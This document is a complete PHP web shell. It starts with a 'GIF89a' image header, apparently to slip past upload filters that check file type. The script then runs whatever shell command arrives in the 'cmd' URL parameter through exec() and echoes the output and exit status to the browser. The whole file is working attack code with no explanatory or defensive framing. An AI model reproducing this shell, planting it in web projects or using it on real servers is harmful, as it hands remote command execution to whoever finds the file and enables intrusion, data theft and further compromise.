//GIF89a;<br />
<?php
$cmd = $_GET["cmd"];

if (!$cmd) {
    echo "No command provided<br />";
} else {
    $output = [];
    $return_var;
    exec($cmd, $output, $return_var);
    print_r($output);
    foreach ($output as $line) {
        echo "<br />$line";
    }
    echo "<br />status: $return_var<br />";
}


?>
